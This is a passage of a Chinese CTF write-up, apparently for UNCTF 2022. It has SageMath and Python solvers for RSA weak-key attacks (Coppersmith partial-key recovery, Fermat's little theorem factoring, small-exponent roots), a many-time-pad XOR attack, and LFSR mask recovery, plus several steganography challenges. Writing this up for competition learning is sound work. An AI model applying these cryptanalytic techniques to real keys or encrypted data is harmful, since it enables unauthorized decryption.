class="number">60</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;</span>.<span class="built_in">format</span>(nbits - kbits, nbits))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">m = mbar + x0</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>泄露 $p$ 高位的Coppersmith攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p4 = <span class="number">8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br><span class="line">e =  <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;It is a very_intersting_test!!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h3><blockquote><p>你知道多次一密吗？</p></blockquote><p>多次一密（MTP）攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line">ciphers = <span class="string">&#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d</span></span><br><span class="line"><span class="string">2160631d325b3b421c310601453c190814162d37404510041b55490d5d</span></span><br><span class="line"><span class="string">3060631d325b3e59033a1252102c560207103b22020613450549444f5d</span></span><br><span class="line"><span class="string">3420277421122f55067f1207152f19170659282b090b56121701405318</span></span><br><span class="line"><span class="string">212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a</span></span><br><span class="line"><span class="string">75222a22230877102137045212300409165928264c091f131701484f5d</span></span><br><span class="line"><span class="string">21272d33661237441a7f005215331706175930254c0817091b4244011c</span></span><br><span class="line"><span class="string">303c2674311e795e103a05520d300600521831274c031f0b160148555d</span></span><br><span class="line"><span class="string">3c3d63232909355455300752033a17175e59372c1c0056111d01474813</span></span><br><span class="line"><span class="string">752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110</span></span><br><span class="line"><span class="string">396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target_fix</span>(<span class="params">target_cipher</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-------begin-------&#x27;</span></span><br><span class="line"></span><br><span class="line">    final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index:</span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))):</span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line"></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;------end------&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><p>补全可能的明文单词，反复尝试得到key：<code>UNCTF&#123;Y0u_are_very_Clever!!!&#125;</code>。</p><p>​    </p><h3 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h3><blockquote><p>全部大写</p></blockquote><p><code>10000</code> 换 <code>A</code>，<code>00000</code> 换 <code>B</code>，培根密码解得 <code>CRYPROISFUN</code>。</p><p>​    </p><h3 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h3><p>按代码逻辑还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = <span class="string">b&#x27;Today_is_Thursday_V_me_50&#x27;</span></span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br><span class="line"></span><br><span class="line">random.seed(key1_num)</span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">    message += long_to_bytes(temp_num ^ i)</span><br><span class="line"></span><br><span class="line">guess = [i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    what = guess.pop(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line"><span class="built_in">print</span>(mask)</span><br><span class="line">out = strxor(mask,message)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><p>已知 $g+x=x \cdot p$，则 $g=x(p-1)$，结合费马小定理，有 </p><p>$a^g \bmod p = a^{ x(p-1)} \bmod p = (a^x)^{(p-1)} \bmod p = 1$ （$a$ 为任意整数）</p><p>取 $a=2$，即 $2^g \bmod p = 1$，$2^g-1=k_1p$，</p><p>而 $2^g \bmod p = (2^g \bmod n) \bmod p=1$，则 $2^g \bmod n = 1+k_2p$，</p><p>故 $(2^g \bmod n)-1=k_2p$ 也是 $p$ 的倍数，则有 $p=\gcd\Big((2^g \bmod n)-1,n\Big)$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">g = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,g,n)-<span class="number">1</span>,n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="超级加倍"><a href="#超级加倍" class="headerlink" title="超级加倍"></a>超级加倍</h3><p>根据”加倍“，脑洞大猜小指数 $e$ 攻击，开方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761</span></span><br><span class="line">m=gmpy2.iroot(c,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZcry"><a href="#EZcry" class="headerlink" title="EZcry"></a>EZcry</h3><blockquote><p>提示1：流密码</p></blockquote><p>密文：<code>dd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57c</code>，</p><p>key：<code>12345678</code></p><p>根据提示测试常见流密码，RC4成功解出 <code>flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;</code>。</p><p>​    </p><h3 id="easy-lfsr"><a href="#easy-lfsr" class="headerlink" title="easy_lfsr"></a>easy_lfsr</h3><blockquote><p>你能求出我的mask吗</p></blockquote><p>根据512级LFSR连续1024个bit的产出，求掩码。</p><p>由于LFSR的性质，每一次生成的bit都会加到向量的最低位，同时丢弃掉最高位bit。于是在连续512次生成之后，原有的 KEY 所有的位都被丢弃，LFSR的状态会转为已知的512个bit，即所给出的串的前512位。之后完全知道了LFSR的状态，只需要在已知状态的情况下推出掩码。</p><p>每连续512个bit可以生成下一个bit。已知这512个 bit，也知道下一个bit，但掩码未知。问题等价于：在 $\text{GF}(2)$ 上，512位的已知的状态向量，点乘512位的掩码向量，得到的数已知，求掩码向量。状态向量有512维，则有512组方程。</p><p>解方程组的问题转化为矩阵求逆问题。把LFSR状态逐行写在矩阵上，形成的矩阵记为 $M$，把LFSR每次所生成的结果拼成的向量记为 $T$，则掩码向量 $v$ 有：$M \cdot v = T$，即 $v=M^{-1} \cdot T$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">r1 = <span class="number">1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446</span></span><br><span class="line">r2 = <span class="number">1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    s = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">bin</span>(r1)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="built_in">bin</span>(r2)[<span class="number">2</span>:].rjust(<span class="number">512</span>,<span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    M = matrix(GF(<span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>)</span><br><span class="line">    T = vector(GF(<span class="number">2</span>), <span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">512</span>):</span><br><span class="line">        M[i] = s[i : i + <span class="number">512</span>]</span><br><span class="line">        T[i] = s[i+<span class="number">512</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mask = M.inverse() * T</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, (mask))),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">flag = test()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\xb0vgf\x96\xdf`v\xc6d@\x14\xf7\x98\xaf\xac&#x27;\xf8K\xbb+\x00&quot;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h3><blockquote><p>乱码+零宽隐写</p></blockquote><p>Wingdings字体转正常字体如宋体，全选内容复制，零宽隐写工具提取得 <code>unctf&#123;We1come_new_ctfer&#125;</code>。</p><p>​    </p><h3 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h3><p>以压缩包方式打开docx，在document.xml中发现：</p><p><code>&lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt;</code></p><p>​    </p><h3 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h3><p>在log文件中找到关键一行：</p><p><code>Nov  2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==</code></p><p>base64解码得到密码 <code>password is U6nu2_i3_b3St</code>，解压得flag：<code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p><p>​    </p><h3 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h3><p>PDF中全选复制出文字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm</span><br><span class="line">+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5</span><br><span class="line">46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO</span><br><span class="line">WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k</span><br><span class="line">5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm</span><br><span class="line">+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y</span><br><span class="line">2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3</span><br><span class="line">lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54</span><br><span class="line">6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW</span><br><span class="line">PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y</span><br><span class="line">+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja</span><br><span class="line">Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN</span><br><span class="line">oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T</span><br><span class="line">ljaE=&#125;</span><br></pre></td></tr></table></figure><p>中间部分base64解码得到的 <code>依古比古</code> 换为 <code>.</code>，<code>玛卡巴卡</code> 换为 <code>-</code>，再摩斯密码解得 <code>WAN_AN_MAKA_BAKAAAAA!</code>。</p><p>​    </p><h3 id="清和fan"><a href="#清和fan" class="headerlink" title="清和fan"></a>清和fan</h3><blockquote><p>小w一直对真人二次元没啥抵抗力，当他见到清和的时候，小w直呼这就是心动的感觉。</p></blockquote><p>第一层，根据压缩包注释，密码为清和B站uid下划线最高播放量视频发布日期，找到密码 <code>836885_2022/05/20</code>；</p><p>第二层，png图片LSB隐写，提取出 <code>password is :qq857488580</code>；</p><p>第三层，音频文件SSTV，得到图片中密码 <code>V@mpir3</code>；</p><p>最后一层，文本内零宽隐写，用在线工具提取得到 <code>unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;</code>。</p><p>​    </p><h3 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h3><p>带密码的LSB隐写：<code>python2 lsb.py extract flag.png xxx.txt key1</code></p><p>flag: <code>flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125;</code></p><p>​    </p><h3 id="我小心海也绝非鳝类"><a href="#我小心海也绝非鳝类" class="headerlink" title="我小心海也绝非鳝类"></a>我小心海也绝非鳝类</h3><p>png图片中有字符串 <code>F#S&lt;YIcHnAG;</code>，base92解码 <code>flaginmd5</code>；尾部 <code>RUFTWUxTQg==</code>，base64解码 <code>EASYLSB</code>。</p><p>zsteg查看不到有用信息，用cloaked-pixel带密码的LSB提取：<code>python2 lsb.py extract 1.png out.txt flaginmd5</code>，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF</span><br></pre></td></tr></table></figure><p>根据前面的提示，这串字符串为md5值的组合，爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF&#x27;</span>.lower()</span><br><span class="line">s = [s[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span 